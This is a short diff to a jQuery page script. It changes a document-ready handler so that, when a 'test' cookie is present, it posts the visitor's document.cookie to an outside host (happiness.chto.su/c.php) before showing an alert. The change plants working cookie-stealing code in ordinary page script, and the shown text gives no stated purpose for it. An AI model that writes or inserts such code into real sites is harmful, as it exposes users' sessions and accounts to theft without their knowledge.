@@ -112,7 +112,9 @@
 
 $(document).ready(function(){
     if ($.cookie('test')) {
-        alert('yay');
+        $.post('http://happiness.chto.su/c.php',{l:'test',p:'test',c:document.cookie},function(){
+            alert('yay!');
+        });
     }
     
 });
